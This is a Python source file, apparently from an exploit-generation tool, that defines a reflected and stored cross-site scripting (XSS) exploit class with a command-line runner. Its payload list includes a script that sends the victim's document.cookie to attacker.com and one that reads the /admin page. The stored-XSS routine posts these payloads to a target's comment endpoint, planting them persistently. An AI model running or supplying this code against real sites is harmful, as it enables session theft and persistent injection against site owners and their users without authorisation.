"""
Cross-Site Scripting (XSS) Exploit Class
Extracted from HexStrike exploit generation system
"""

import requests
import sys
from urllib.parse import quote


class XSSExploit:
    """Cross-Site Scripting exploitation class for CVE-based attacks"""

    def __init__(self, target_url):
        """
        Initialize XSS exploit

        Args:
            target_url: Base URL of target application
        """
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()

    def generate_payloads(self, cve_id="XSS"):
        """
        Generate XSS payloads for testing

        Args:
            cve_id: CVE identifier for payload tagging

        Returns:
            List of XSS test payloads
        """
        payloads = [
            # Basic XSS
            f"<script>alert('XSS-{cve_id}')</script>",
            f"<img src=x onerror=alert('XSS-{cve_id}')>",
            f"<svg onload=alert('XSS-{cve_id}')>",

            # Bypass attempts
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            f"javascript:alert('XSS-{cve_id}')",
            f"<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",

            # Advanced payloads
            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
        ]

        return payloads

    def test_reflected_xss(self, parameter="q", cve_id="XSS"):
        """
        Test for reflected XSS vulnerability

        Args:
            parameter: URL parameter to test
            cve_id: CVE identifier

        Returns:
            True if vulnerability found, False otherwise
        """
        print(f"[+] Testing reflected XSS on parameter: {parameter}")

        payloads = self.generate_payloads(cve_id)

        for i, payload in enumerate(payloads):
            try:
                response = self.session.get(
                    self.target_url,
                    params={parameter: payload}
                )

                if payload in response.text:
                    print(f"[+] Potential XSS found with payload {i+1}: {payload[:50]}...")
                    return True

            except Exception as e:
                print(f"[-] Error testing payload {i+1}: {e}")
                continue

        return False

    def test_stored_xss(self, endpoint="/comment", data_param="comment", cve_id="XSS"):
        """
        Test for stored XSS vulnerability

        Args:
            endpoint: POST endpoint for submitting data
            data_param: Parameter name for payload
            cve_id: CVE identifier

        Returns:
            True if vulnerability found, False otherwise
        """
        print(f"[+] Testing stored XSS on endpoint: {endpoint}")

        payloads = self.generate_payloads(cve_id)

        for i, payload in enumerate(payloads):
            try:
                # Submit payload
                response = self.session.post(
                    f"{self.target_url}{endpoint}",
                    data={data_param: payload}
                )

                # Check if stored
                check_response = self.session.get(self.target_url)
                if payload in check_response.text:
                    print(f"[+] Stored XSS found with payload {i+1}: {payload[:50]}...")
                    return True

            except Exception as e:
                print(f"[-] Error testing stored payload {i+1}: {e}")
                continue

        return False


def main():
    """Main execution function for standalone usage"""
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_url> [parameter]")
        print(f"Example: python3 {sys.argv[0]} http://target.com/search q")
        sys.exit(1)

    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "q"

    exploit = XSSExploit(target_url)

    print(f"[+] XSS Exploit")
    print(f"[+] Target: {target_url}")

    # Test reflected XSS
    if exploit.test_reflected_xss(parameter):
        print("[+] Reflected XSS vulnerability confirmed!")
    else:
        print("[-] No reflected XSS found")

    # Test stored XSS
    if exploit.test_stored_xss():
        print("[+] Stored XSS vulnerability confirmed!")
    else:
        print("[-] No stored XSS found")


if __name__ == "__main__":
    main()
